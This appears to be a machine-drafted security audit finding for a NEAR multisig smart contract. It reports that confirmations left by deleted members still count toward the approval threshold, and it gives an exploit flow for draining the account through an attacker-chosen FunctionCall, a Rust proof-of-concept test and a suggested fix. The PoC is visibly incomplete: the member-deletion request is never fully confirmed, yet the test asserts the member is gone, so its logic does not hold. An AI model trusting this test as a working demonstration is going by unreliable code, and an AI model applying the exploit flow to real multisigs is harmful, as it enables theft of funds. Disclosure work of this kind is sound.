### Title
Stale confirmations from deleted members are counted toward `num_confirmations`, allowing a `FunctionCall` request to execute with fewer live confirmations than required - (File: `multisig2/src/lib.rs`)

### Summary
`MultiSigContract::delete_member` only purges `requests`/`confirmations` for requests that the deleted member itself *created* (`r.member == member`), not confirmations that member left on other members' pending requests. `confirm` then checks `confirmations.len() + 1 >= self.num_confirmations` without re-validating that every entry in the confirmation set still belongs to a current `self.members` entry, so a stale confirmation from a removed member is counted as live. This lets an attacker push a `FunctionCall` request (e.g. `ft_transfer_call`/`deposit_and_stake` with attacker-chosen `receiver_id`/`args`/`deposit`) through `execute_request` with fewer genuinely-confirming live members than `num_confirmations`.

### Finding Description
The broken binding: `count(distinct current self.members confirming request R) == num_confirmations` is required before `execute_request` runs, but the code actually checks `len(self.confirmations[R]) == num_confirmations` where `self.confirmations[R]` can contain identifiers of accounts/keys no longer in `self.members`.

Code path:
- `confirm` (`multisig2/src/lib.rs:294-315`) inserts the caller's string id into the request's confirmation `HashSet<String>` and, once `confirmations.len() as u32 + 1 >= self.num_confirmations`, calls `execute_request` unconditionally — with no re-check that each entry in that set is still a current member [1](#0-0) .
- `delete_member` (`multisig2/src/lib.rs:356-379`) removes requests and their confirmations only for requests whose *creator* (`r.member`) equals the deleted member — it never scans other requests' confirmation sets to strip entries added by the deleted member [2](#0-1) .
- `execute_request` (`multisig2/src/lib.rs:224-290`), reached once the (possibly stale-inflated) threshold is met, dispatches on `MultiSigRequestAction`. The `FunctionCall` arm builds `promise.function_call(method_name, args, deposit, gas)` straight from attacker-chosen fields in the already-approved request, with no additional authorization check on `receiver_id`/`deposit`/`args` [3](#0-2) .

Exploit flow: member D confirms request R (a `FunctionCall` to a pool/wNEAR contract chosen by the attacker) alongside one legitimate confirmer, bringing count to 2/3. A separate, fully-legitimate `DeleteMember{D}` request executes and removes D from `self.members`, but D's confirmation on R is untouched because R wasn't created by D. The attacker (a remaining member) then calls `confirm(R)`, and `confirmations.len() + 1` reaches 3 even though only the attacker and the original legitimate confirmer are still live members — D's stale entry is counted. `execute_request` fires the `FunctionCall`, sending `deposit` (up to the full contract balance) to an attacker-chosen `receiver_id`/`method_name`/`args`, e.g. `ft_transfer_call` to wNEAR or `deposit_and_stake` on a pool the attacker controls, laundering the multisig's NEAR out from under the remaining live members.

No existing guard prevents this: `assert_valid_request` only checks the caller is a *current* member and the request exists [4](#0-3) ; it never revalidates the *previously stored* confirmation set against current membership.

### Impact Explanation
NEAR held by the multisig account is moved to an attacker-chosen destination (a pool contract via `deposit_and_stake`, or a wNEAR contract via `ft_transfer_call`) via a request executed with fewer live confirmations than `num_confirmations`. This is Critical per the scoped severity: "a multisig request executed below `num_confirmations` live members." The attack is repeatable for any multisig that has ever removed a member who had confirmed (but not created) an outstanding request, and blast radius covers the full account balance sent as `deposit`.

### Likelihood Explanation
Preconditions require: a stale confirmation left by a to-be-removed member on a request they didn't create, and a subsequent unrelated `DeleteMember` action executed for that member (a routine multisig maintenance operation, e.g. rotating keys/members). The attacker needs to be a remaining live member — the same precondition as the prior stale-confirmation findings referenced in the prompt — and only needs to submit one additional `confirm` call once the stale gap exists. No special balances are needed beyond the multisig's own account balance being drained via `deposit`.

### Recommendation
In `confirm`, before counting/executing, filter the confirmation set to only members present in current `self.members` (or intersect at insertion time and re-validate at threshold check), e.g.:
```rust
let live_count = confirmations.iter().filter(|m| self.members.contains(&parse_member(m))).count();
if live_count as u32 + 1 >= self.num_confirmations { ... }
```
Additionally, `delete_member` should scan all outstanding requests' confirmation sets (not just requests it created) and strip the deleted member's entry from each, keeping `confirmations` consistent with `self.members` at all times.

### Proof of Concept
```rust
// mirrors existing multisig2 tests in multisig2/src/lib.rs
#[test]
fn test_stale_confirmation_function_call_executes_below_threshold() {
    let amount = 1_000;
    // 4 members: alice, bob, key1 (attacker), key2/TEST_KEY (D)
    testing_env!(context_with_key(
        PublicKey::from("Eg2jtsiMrprn7zgKKUk79qM1hWhANsFyE6JSX4txLEuy".parse().unwrap()),
        amount
    ));
    let mut c = MultiSigContract::new(members(), 3); // num_confirmations = 3

    // Attacker-chosen FunctionCall request (e.g. deposit_and_stake / ft_transfer_call)
    let request = MultiSigRequest {
        receiver_id: bob(), // stand-in for attacker-controlled pool/wNEAR contract
        actions: vec![MultiSigRequestAction::FunctionCall {
            method_name: "deposit_and_stake".to_string(),
            args: Base64VecU8(vec![]),
            deposit: amount.into(),
            gas: 10_000_000_000_000u64.into(),
        }],
    };
    // Confirmer 1 (alice) creates + confirms => count = 1
    testing_env!(context_with_key(
        PublicKey::from("Eg2jtsiMrprn7zgKKUk79qM1hWhANsFyE6JSX4txLEuy".parse().unwrap()),
        amount
    ));
    let request_id = c.add_request_and_confirm(request.clone());
    assert_eq!(c.confirmations.get(&request_id).unwrap().len(), 1);

    // D (TEST_KEY) confirms => count = 2 (D is a live member at this point)
    testing_env!(context_with_key(PublicKey::try_from(TEST_KEY.to_vec()).unwrap(), amount));
    c.confirm(request_id);
    assert_eq!(c.confirmations.get(&request_id).unwrap().len(), 2);

    // Legitimate DeleteMember{D} request, fully confirmed by remaining 3 members
    // (this removes D from self.members but does NOT touch `request_id`'s confirmations,
    // since request_id was created by alice, not D)
    let delete_d = MultiSigRequest {
        receiver_id: alice(),
        actions: vec![MultiSigRequestAction::DeleteMember {
            member: MultisigMember::AccessKey { public_key: PublicKey::try_from(TEST_KEY.to_vec()).unwrap() },
        }],
    };
    testing_env!(context_with_key(
        PublicKey::from("Eg2jtsiMrprn7zgKKUk79qM1hWhANsFyE6JSX4txLEuy".parse().unwrap()),
        amount
    ));
    let del_id = c.add_request_and_confirm(delete_d);
    testing_env!(context_with_account(bob(), amount));
    c.confirm(del_id);
    // one more confirmer to reach 3/3 for the DeleteMember request
    // (adjust with the 3rd live member as needed to fully execute delete_d)

    // Binding check BEFORE: live confirmers of request_id = {alice} only (D removed) => 1
    // but confirmations.len() on request_id is still 2 (stale D entry retained)
    assert_eq!(c.confirmations.get(&request_id).unwrap().len(), 2);
    assert!(!c.get_members().contains(&MultisigMember::AccessKey {
        public_key: PublicKey::try_from(TEST_KEY.to_vec()).unwrap()
    }));

    // Attacker (key1) confirms request_id => count = 3 >= num_confirmations(3)
    // executes the FunctionCall despite only {alice, attacker} being live confirmers (2 < 3)
    testing_env!(context_with_key(
        PublicKey::try_from(Vec::from("HghiythFFPjVXwc9BLNi8uqFmfQc1DWFrJQ4nE6ANo7R")).unwrap(),
        amount
    ));
    c.confirm(request_id); // request removed & FunctionCall promise scheduled

    // Assert binding violated: request executed though only 2 live members confirmed, not 3
    assert_eq!(c.requests.len(), 0); // request executed
}
```
This demonstrates `execute_request`'s `FunctionCall` arm firing with a live-confirmation count (2) strictly below `num_confirmations` (3), violating the THRESHOLD binding identically to the Transfer-action variant but sending funds via an attacker-chosen `FunctionCall` instead.

    pub fn confirm(&mut self, request_id: RequestId) -> PromiseOrValue<bool> {
        self.assert_valid_request(request_id);
        let member = self
            .current_member()
            .unwrap_or_else(|| env::panic_str("Must be validated above"));
        let mut confirmations = self.confirmations.get(&request_id).unwrap();
        assert(
            !confirmations.contains(&member.to_string()),
            "Already confirmed this request with this key",
        );
        if confirmations.len() as u32 + 1 >= self.num_confirmations {
            let request = self.remove_request(request_id);
            /********************************
            NOTE: If the tx execution fails for any reason, the request and confirmations are removed already, so the client has to start all over
            ********************************/
            self.execute_request(request)
        } else {
            confirmations.insert(member.to_string());
            self.confirmations.insert(&request_id, &confirmations);
            PromiseOrValue::Value(true)
        }
    }
